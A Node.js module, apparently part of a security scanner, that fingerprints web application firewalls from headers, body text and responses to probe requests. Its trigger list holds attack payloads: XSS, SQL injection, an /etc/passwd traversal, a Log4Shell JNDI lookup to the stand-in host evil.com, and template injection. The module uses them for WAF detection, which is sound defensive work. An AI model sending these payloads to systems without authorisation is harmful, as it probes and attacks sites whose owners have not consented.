const axios = require('axios');

const WAF_SIGNATURES = {
  headers: [
    { pattern: /cloudflare/i, name: 'Cloudflare WAF', header: 'server' },
    { pattern: /cf-ray/i, name: 'Cloudflare', header: 'cf-ray' },
    { pattern: /sucuri/i, name: 'Sucuri WAF', header: 'server' },
    { pattern: /x-sucuri/i, name: 'Sucuri', header: 'x-sucuri-id' },
    { pattern: /akamai/i, name: 'Akamai WAF', header: 'server' },
    { pattern: /incapsula/i, name: 'Imperva Incapsula', header: 'x-iinfo' },
    { pattern: /imperva/i, name: 'Imperva WAF', header: 'server' },
    { pattern: /f5/i, name: 'F5 BIG-IP', header: 'server' },
    { pattern: /barracuda/i, name: 'Barracuda WAF', header: 'server' },
    { pattern: /modsecurity/i, name: 'ModSecurity', header: 'server' },
    { pattern: /aws/i, name: 'AWS WAF', header: 'server' },
    { pattern: /x-amz-cf/i, name: 'AWS CloudFront', header: 'x-amz-cf-id' },
    { pattern: /azure/i, name: 'Azure WAF', header: 'server' },
    { pattern: /fortinet|fortigate/i, name: 'FortiWeb WAF', header: 'server' },
    { pattern: /wallarm/i, name: 'Wallarm WAF', header: 'server' },
    { pattern: /reblaze/i, name: 'Reblaze WAF', header: 'server' },
    { pattern: /stackpath/i, name: 'StackPath WAF', header: 'server' },
    { pattern: /fastly/i, name: 'Fastly WAF', header: 'server' },
    { pattern: /x-cdn/i, name: 'CDN detected', header: 'x-cdn' },
    { pattern: /ddos-guard/i, name: 'DDoS-Guard', header: 'server' },
  ],
  bodyPatterns: [
    { pattern: /cloudflare/i, name: 'Cloudflare' },
    { pattern: /attention required/i, name: 'WAF Challenge Page' },
    { pattern: /access denied/i, name: 'WAF Block' },
    { pattern: /403 forbidden/i, name: 'WAF Forbidden' },
    { pattern: /request blocked/i, name: 'WAF Request Blocked' },
    { pattern: /web application firewall/i, name: 'WAF Detected' },
    { pattern: /sucuri/i, name: 'Sucuri' },
    { pattern: /incapsula/i, name: 'Incapsula' },
    { pattern: /wordfence/i, name: 'Wordfence' },
  ]
};

async function scan(targetUrl) {
  const results = { detected: [], tests: [] };
  try {
    // Normal request
    const response = await axios.get(targetUrl, {
      timeout: 15000, maxRedirects: 5, validateStatus: () => true,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' }
    });
    const headers = response.headers;
    const body = typeof response.data === 'string' ? response.data : '';

    // Check headers for WAF signatures
    for (const sig of WAF_SIGNATURES.headers) {
      let headerVal = '';
      for (const [key, val] of Object.entries(headers)) {
        if (key.toLowerCase() === sig.header.toLowerCase() || sig.pattern.test(key)) {
          headerVal = val;
        }
      }
      if (sig.pattern.test(headerVal) || sig.pattern.test(Object.keys(headers).join(' '))) {
        results.detected.push({ name: sig.name, source: 'headers', header: sig.header });
        results.tests.push({ id: `waf-header-${sig.name.replace(/\s/g,'-')}`, name: `WAF detected: ${sig.name}`, status: 'info', severity: 'info' });
      } else {
        results.tests.push({ id: `waf-header-${sig.name.replace(/\s/g,'-')}`, name: `WAF check: ${sig.name}`, status: 'pass', severity: 'info' });
      }
    }

    // Check body for WAF patterns
    for (const sig of WAF_SIGNATURES.bodyPatterns) {
      if (sig.pattern.test(body)) {
        results.tests.push({ id: `waf-body-${sig.name.replace(/\s/g,'-')}`, name: `WAF body pattern: ${sig.name}`, status: 'info', severity: 'info' });
      }
    }

    // Test with malicious payload to trigger WAF
    const triggerPayloads = [
      "<script>alert('xss')</script>",
      "' OR 1=1 --",
      "../../../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
      "{{7*7}}",
    ];

    // Run trigger-payload tests in parallel (not sequential)
    await Promise.all(triggerPayloads.map(async (payload) => {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set('test', payload);
        const testResp = await axios.get(testUrl.toString(), {
          timeout: 4000, maxRedirects: 2, validateStatus: () => true,
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' }
        });
        if (testResp.status === 403 || testResp.status === 406 || testResp.status === 429) {
          results.tests.push({ id: `waf-trigger-${payload.substring(0,10).replace(/[^a-z0-9]/gi,'')}`, name: `WAF blocks attack payload (${testResp.status})`, status: 'info', severity: 'info' });
          results.detected.push({ name: 'WAF Active', source: 'trigger-test', triggerStatus: testResp.status });
        } else {
          results.tests.push({ id: `waf-trigger-${payload.substring(0,10).replace(/[^a-z0-9]/gi,'')}`, name: `WAF did not block payload`, status: 'info', severity: 'info' });
        }
      } catch { /* timeout/block */ }
    }));

    // Rate limiting check — 5 parallel requests (fewer = less chance of banning our own IP)
    try {
      const promises = Array.from({ length: 5 }, () =>
        axios.get(targetUrl, { timeout: 3000, validateStatus: () => true, headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' } }).catch(() => null)
      );
      const responses = (await Promise.all(promises)).filter(Boolean);
      const blocked = responses.filter(r => r.status === 429 || r.status === 503);
      results.tests.push({ id: 'waf-rate-limit', name: 'Rate limiting active', status: blocked.length > 0 ? 'pass' : 'info', severity: 'info' });
    } catch { /* skip */ }

  } catch (err) {
    results.error = `WAF detection failed: ${err.message}`;
  }
  return { scanner: 'WAF Detection', icon: '🧱', results, testCount: results.tests.length };
}

module.exports = { scan };
